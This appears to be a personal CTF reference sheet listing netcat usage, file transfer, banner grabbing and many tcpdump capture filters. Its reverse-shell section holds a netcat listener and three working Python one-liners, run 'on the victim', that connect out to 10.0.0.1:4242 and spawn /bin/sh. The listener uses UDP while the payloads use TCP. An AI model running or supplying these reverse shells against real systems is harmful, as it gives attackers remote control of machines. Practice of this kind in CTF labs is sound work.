All the related netcat and listener things related to CTFs.

# Netdiscover
Listen to arp (address resolution protocol) things. 

# Netcat
- Pushing a file to a client: `nc -w3 [ip addr] [port] < file`
- Receiving a file: `nc -l -p [port] > outfile`
- Grab a banner using netcat: `echo "" | nc -v -n -w1 [target ip] [port]`
- `nc -nvv` -> very verbose

## Setting up reverse shell
Resources:
- [github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

First, set up netcat:
`nc -u -lvp 4242`

On the victim, can run:
- `export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`
- `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`
- `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`

# Listen to things
- Capture any packet: `sudo tcpdump -i any -w output.pcap`
    - Then analyze: `wireshark output.pcap`
- Only listen to HTTP (port 80) traffic: `sudo tcpdump -i any port 80 -w /path/to/outputfile.pcap`
- Capture certain num of packets on interface eth0: `sudo tcpdump -c 10 -i eth0`
- filter by source: `sudo tcpdump src 10.0.0.1`
- filter by destination: `sudo tcpdump dst 10.0.0.1`
- filter by protocol: `sudo tcpdump icmp`
- filter by source port: `sudo tcpdump src port 80`
- filter by dst port: `sudo tcpdump dst port 80`
- capture with specific flags: `sudo tcpdump 'tcp[13] & (tcp-syn|tcp-ack) != 0'`
- capture with certain length: `sudo tcpdump 'len > 0'`
- dns traffic (port 53): `sudo tcpdump port 53`
- capture without resolving hostnames: `sudo tcpdump -n`
- capture of a large length: `sudo tcpdump 'len > 100'`
- filter by network: `sudo tcpdump net 192.168.1.0/24`
- increase verbosity: `sudo tcpdump -vvv`
